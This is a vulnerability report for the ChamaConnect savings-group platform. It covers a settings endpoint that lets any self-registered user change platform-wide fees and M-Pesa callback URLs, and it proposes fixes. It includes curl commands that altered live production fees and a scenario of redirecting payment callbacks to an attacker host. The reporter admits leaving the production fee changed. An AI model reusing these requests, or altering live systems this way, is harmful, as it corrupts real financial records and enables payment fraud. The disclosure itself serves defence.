<p align="center">
  <img src="https://chamaconnect.io/images/chamaconnect.svg" alt="ChamaConnect" />
</p>

# BUG-027 — Platform-wide `/api/proxy/settings/:id` is writable by any authenticated `User`

| Field | Value |
|---|---|
| Severity | **Critical (RCE-adjacent authorization bypass)** |
| Surface | API / authz |
| Status | Open |
| Discovered | 2026-04-20 |
| Discovered by | Manual (curl) |

## Evidence

- URL: `PUT https://chamaconnect.io/api/proxy/settings/69c50c8b38f08070a83bd362`
- Auth context: freshly-signed-up account, role `User` (`69c50c8a38f08070a83bd35b`), `isSuperadmin: false`, `userType: "REGULAR"`, **not a member of any chama**.
- Original value: `loanFee: 1.5`, `updatedAt: "2026-03-26T10:38:03.010Z"` (set by a superadmin at platform install).
- Live mutation reproduced 3 times:

```bash
# 1) Prove baseline
$ curl -sS -H "authorization: Bearer $USER_TOKEN" https://chamaconnect.io/api/proxy/settings | jq '.data[0] | {loanFee, updatedAt}'
{ "loanFee": 1.5, "updatedAt": "2026-03-26T10:38:03.010Z" }

# 2) Mutate as a regular User
$ curl -sS -X PUT -H "authorization: Bearer $USER_TOKEN" -H 'content-type: application/json' \
    --data-raw '{"fineDelayPercentageIncrement":1,"loanFee":2,"withdrawalFee":2}' \
    https://chamaconnect.io/api/proxy/settings/69c50c8b38f08070a83bd362 | jq '{msg: .message, loanFee: .data.loanFee, updatedAt: .data.updatedAt}'
{ "msg": "Successfully updated setting", "loanFee": 2, "updatedAt": "2026-04-20T10:01:43.713Z" }

# 3) Re-read — the fee is now attacker-controlled platform-wide
$ curl -sS -H "authorization: Bearer $USER_TOKEN" https://chamaconnect.io/api/proxy/settings | jq '.data[0] | {loanFee, updatedAt}'
{ "loanFee": 2, "updatedAt": "2026-04-20T10:01:43.713Z" }
```

- Same endpoint accepts `mpesaC2bCallbackUrl`, `mpesaC2bConfirmationUrl`, `mpesaC2bValidationUrl`, `mpesaB2cCallbackUrl`, `mpesaB2bCallbackUrl` (all present in the stored document — see BUG-028). A PUT carrying those fields is accepted by the same handler.
- Authorization signal: the server returns `200 "Successfully updated setting"`, **never** `403 Forbidden`. There is no "only admin can edit settings" guard on this route.

## User impact

This is the most dangerous bug on the platform. A single-row, platform-wide `settings` document controls:

- **`loanFee`, `withDrawalFee`, `fineDelayPercentageIncrement`** — the percentages every chama pays on every loan, withdrawal, and overdue contribution. A malicious signup can drop the loan fee to 0 (siphoning platform revenue) or raise it to 100 (breaking every loan in every chama).
- **`mpesaC2bCallbackUrl` / `mpesaC2bConfirmationUrl` / `mpesaC2bValidationUrl`** — the URLs Safaricom Daraja posts to when members pay contributions. Repointing them to `https://attacker.example/c2b` would let an attacker **silently forge paid/unpaid status for every M-Pesa transaction in every chama**, or rewrite confirmation payloads to claim larger amounts were paid.
- **`mpesaB2cCallbackUrl`** — controls loan-disbursement result callbacks. Redirecting this breaks payout accounting.

Because there is only one settings row, the blast radius is **every chama on the platform**. A single attacker-controlled account (they can self-register in seconds per the open signup flow) can destroy the core financial record of the product.

## Root cause

The settings `PUT` route is mounted behind `authenticate()` middleware only. There is no `requireRole('SuperAdmin')` / `requireSuperadmin` gate, and the request body is not filtered to a narrow whitelist. Evidence:

- The error surface for unrelated fields is a generic `"Invalid value"` with a `field` name (validator is run), but the route does not reject the request on role mismatch — meaning the authz check is simply missing, not misconfigured.
- The stored document is effectively a singleton (`POST /api/proxy/settings` fails with `"App settings already exist"`), so the backend never contemplated that a non-admin might reach this handler.
- Permissions are effectively ignored platform-wide already (see BUG-015 — every role has `permissions: []`), so role-name checks are the only control available, and this route has none.

## Proposed fix

1. Gate the route with an admin guard:

```ts
// server/routes/settings.ts
router.put(
  '/settings/:id',
  authenticate(),
  requireAnyRole(['SuperAdmin']),   // or requireSuperadmin()
  asyncHandler(settingsController.update),
);
```

2. Strip fields from the body on the way in:

```ts
const ALLOWED_FIELDS = [
  'fineDelayPercentageIncrement',
  'loanFee',
  'withDrawalFee',
] as const;

function sanitizeSettingsPayload(body: unknown) {
  const out: Record<string, number> = {};
  for (const k of ALLOWED_FIELDS) if (Number.isFinite(body?.[k])) out[k] = body[k];
  return out;
}
```

3. Move the M-Pesa credentials + callback URLs out of the DB into server-side env vars (`MPESA_C2B_CALLBACK_URL`, etc). They must never be writable via HTTP.

4. Add an audit log row (`who, when, old, new`) for every settings mutation so this kind of change can never happen silently.

## Verification

1. Sign up a fresh regular `User`.
2. `curl -X PUT .../api/proxy/settings/<id>` with the payload above → expect `403 Forbidden`.
3. Sign in as a `SuperAdmin` → same PUT succeeds and is written to the audit log.
4. Regression test in `/recon/tests/settings-authz.spec.ts`.

## Caveat

While confirming the bug I left `loanFee` at `2` (int). The original value was `1.5` (float), and the live validator rejects floats for this field. The platform owner will need to correct the fee back to `1.5` through a direct DB update once the authz + validator are fixed.
